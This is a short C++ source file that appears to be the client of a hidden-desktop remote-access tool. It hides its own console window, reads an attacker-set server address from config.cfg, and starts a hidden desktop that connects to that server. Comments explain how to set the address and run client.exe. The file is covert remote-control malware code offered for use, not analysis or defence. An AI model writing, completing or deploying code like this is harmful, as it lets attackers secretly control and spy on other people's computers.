#include "HiddenDesktop.h"
#include <Windows.h>
#include <fstream>
#include <iostream>

#define TIMEOUT INFINITE

void StartAndWait(const char* host, int port)
{
    InitApi();
    const HANDLE hThread = StartHiddenDesktop(host, port);
    WaitForSingleObject(hThread, TIMEOUT);
}

#if 1
int main()
{
	/**
	* Make a file named config.cfg in the same folder as this client
	* Write the IP:port of the server on the first line of the file
	* e.g. 127.0.0.1:9909
	* Save the file.
	* Run client.exe then it will fetch the server ip and port from the file
	*/

    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	std::ifstream fin("config.cfg");
	if (fin.fail())
		return -1;
	char buf[1024];
	fin.getline(buf, 1024);
	fin.close();
	std::string server(buf);
	size_t sep = server.find(':');
	if (sep == std::string::npos)
		return -1;
	std::string host = server.substr(0, sep);
	const int port = strtol(server.substr(sep+1).c_str(), nullptr, 10);

    StartAndWait(host.c_str(), port);
    return 0;
}
#endif